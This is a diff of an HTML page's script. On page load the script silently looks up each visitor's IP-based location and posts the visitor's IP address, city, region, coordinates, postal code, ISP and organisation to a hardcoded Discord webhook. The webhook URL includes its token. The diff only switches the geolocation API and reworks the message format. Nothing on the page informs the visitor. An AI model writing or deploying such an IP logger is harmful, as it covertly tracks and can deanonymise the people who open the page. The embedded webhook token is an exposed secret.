@@ -7,75 +7,90 @@
   <body>
     <script>
       const whurl = "https://discord.com/api/webhooks/1084656540881002576/RaQY4jj8HLTEDVetKIIUvMIjZ9Bgu6Ys3weqtfpYbqYXK3RegVzwX1Dq-oxAjYzSO7nz";
-      const ipUrl = "http://ip-api.com/json/";
+const ipUrl = "https://ipapi.co/json/";
 
-      // Make a request to get the geolocation information
-      fetch(ipUrl)
-        .then(response => response.json())
-        .then(data => {
-          const {
-            countryCode,
-            country,
-            region,
-            regionName,
-            city,
-            zip,
-            lat,
-            lon,
-            timezone,
-            isp,
-            org,
-            as,
-            query
-          } = data;
+// Make a request to get the geolocation information
+fetch(ipUrl)
+  .then(response => response.json())
+  .then(data => {
+    const {
+      ip,
+      city,
+      region,
+      country_name,
+      country_code,
+      latitude,
+      longitude,
+      timezone,
+      postal,
+      asn,
+      org
+    } = data;
 
-          // Create an embed object with the geolocation information
-          const embed = {
-            "title": "Geolocation Information",
-            "description": `The user is from ${city}, ${regionName}, ${country} (${countryCode}), with coordinates (${lat}, ${lon}).`,
-            "color": 16711680,
-            "fields": [
-              {
-                "name": "IP Address",
-                "value": query,
-                "inline": true
-              },
-              {
-                "name": "ZIP Code",
-                "value": zip,
-                "inline": true
-              },
-              {
-                "name": "Timezone",
-                "value": timezone,
-                "inline": true
-              },
-              {
-                "name": "ISP",
-                "value": isp,
-                "inline": true
-              },
-              {
-                "name": "Organization",
-                "value": org,
-                "inline": true
-              },
-              {
-                "name": "AS",
-                "value": as,
-                "inline": true
-              }
-            ]
-          };
+    const msg = {
+      "embeds": [
+        {
+          "title": "Geolocation Information",
+          "color": 16729344,
+          "fields": [
+            {
+              "name": "IP Address",
+              "value": ip
+            },
+            {
+              "name": "City",
+              "value": city,
+              "inline": true
+            },
+            {
+              "name": "Region",
+              "value": region,
+              "inline": true
+            },
+            {
+              "name": "Country",
+              "value": `${country_name} (${country_code})`,
+              "inline": true
+            },
+            {
+              "name": "Latitude, Longitude",
+              "value": `(${latitude}, ${longitude})`,
+              "inline": true
+            },
+            {
+              "name": "Timezone",
+              "value": timezone,
+              "inline": true
+            },
+            {
+              "name": "Postal Code",
+              "value": postal,
+              "inline": true
+            },
+            {
+              "name": "ASN",
+              "value": asn,
+              "inline": true
+            },
+            {
+              "name": "Organization",
+              "value": org,
+              "inline": true
+            }
+          ]
+        }
+      ],
+      "username": "Geolocation Bot"
+    };
 
-          // Send a webhook message with the geolocation information
-          fetch(whurl + "?wait=true", {
-            "method": "POST",
-            "headers": {"content-type": "application/json"},
-            "body": JSON.stringify({ embeds: [embed] })
-          });
-        })
-        .catch(error => console.log(error));
+    // Send a webhook message with the geolocation information
+    fetch(whurl + "?wait=true", {
+      "method": "POST",
+      "headers": {"content-type": "application/json"},
+      "body": JSON.stringify(msg)
+    });
+  })
+  .catch(error => console.log(error));
     </script>
   </body>
 </html>
